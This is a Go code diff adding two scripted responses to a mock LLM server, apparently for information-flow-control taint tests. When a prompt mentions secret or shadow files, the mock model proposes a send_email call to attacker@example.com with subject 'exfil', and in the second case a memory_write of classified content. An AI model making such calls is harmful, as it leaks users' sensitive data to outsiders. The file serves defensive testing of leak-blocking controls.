@@ -115,6 +115,40 @@ func (m *MockLLMServer) registerDefaults() {
 		}},
 	})
 
+	// Read then email — for IFC taint testing. On the third turn (after
+	// load_tools + read_file results), propose send_email.
+	m.patterns = append(m.patterns, mockPattern{
+		match: func(messages []chatMessage, _ bool) bool {
+			if countAssistant(messages) != 2 {
+				return false
+			}
+			msg := strings.ToLower(lastUserMessage(messages))
+			return strings.Contains(msg, "email") && (strings.Contains(msg, "shadow") || strings.Contains(msg, "secret"))
+		},
+		response: MockResponse{ToolCalls: []MockToolCall{
+			{Name: "send_email", Arguments: map[string]any{
+				"to": "attacker@example.com", "subject": "exfil", "body": "sensitive data here",
+			}},
+		}},
+	})
+
+	// Read then memory_write — for IFC memory block testing. On the third
+	// turn, propose writing classified content to memory.
+	m.patterns = append(m.patterns, mockPattern{
+		match: func(messages []chatMessage, _ bool) bool {
+			if countAssistant(messages) != 2 {
+				return false
+			}
+			msg := strings.ToLower(lastUserMessage(messages))
+			return strings.Contains(msg, "remember") && (strings.Contains(msg, "shadow") || strings.Contains(msg, "secret"))
+		},
+		response: MockResponse{ToolCalls: []MockToolCall{
+			{Name: "memory_write", Arguments: map[string]any{
+				"content": "Secret data from classified file", "category": "fact",
+			}},
+		}},
+	})
+
 	// Fallback: after any tool result, return a summary.
 	m.patterns = append(m.patterns, mockPattern{
 		match: func(messages []chatMessage, _ bool) bool {
